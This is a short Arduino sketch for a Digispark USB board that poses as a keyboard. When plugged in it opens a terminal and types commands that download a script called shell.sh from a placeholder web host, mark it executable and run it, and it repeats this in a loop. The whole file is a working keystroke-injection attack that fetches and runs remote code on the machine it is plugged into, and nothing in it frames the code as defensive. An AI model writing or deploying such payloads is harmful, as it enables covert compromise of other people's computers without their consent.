#include <DigiUSB.h>
#include <DigiKeyboard.h>

void setup() {
  DigiUSB.begin();
  DigiKeyboard.begin();
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_GUI_LEFT); // Open Terminal
  delay(1000);
  DigiKeyboard.println("wget http://yourwebsite.com/shell.sh"); // Download shell
  delay(2000);
  DigiKeyboard.println("chmod +x shell.sh"); // Make the shell executable
  delay(2000);
  DigiKeyboard.println("./shell.sh"); // Run the shell
}